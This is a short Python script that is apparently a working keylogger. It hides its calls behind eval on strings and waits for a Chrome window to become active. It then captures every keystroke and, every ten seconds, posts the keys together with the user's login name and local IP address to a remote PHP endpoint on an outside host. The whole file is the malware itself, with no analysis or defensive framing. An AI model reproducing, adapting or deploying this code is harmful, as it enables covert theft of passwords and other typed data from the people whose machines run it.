import pynput
import requests
import threading
import time
import pygetwindow as gw
import socket
import os
user_name=eval("os.getlogin()")
hoptaly="pynput.keyboard.Listener(on_press=on_press)"
bac_patuhan="gw.getActiveWindow()"
en_sokety="socket.socket(socket.AF_INET, socket.SOCK_DGRAM)"
req="requests"
tr="threading"
im_sayty="http://telegrz5.beget.tech/take.php"
KEYS=[]  
def yornq_onum():
    s=eval(en_sokety)
    s.connect(("8.8.8.8", 80))
    de_en_myusy=s.getsockname()[0]
    s.close()
    return de_en_myusy
en_bany=yornq_onum()
def on_press(key):
    try:
        KEYS.append(str(key))
    except Exception as e:
        KEYS.append("Error")
def send_logs():
    while True:
        if KEYS:
            eval(req).post(im_sayty,data={"logs": f'User: {user_name} (IP: {en_bany}) {KEYS}'})
            KEYS.clear()
        time.sleep(10)
while True:
    bac_pat=eval(bac_patuhan)
    if bac_pat and "chrome" in bac_pat.title.lower():
        ls=eval(hoptaly)
        ls.start()
        eval(tr).Thread(target=send_logs, daemon=True).start()
        ls.join()
    time.sleep(1)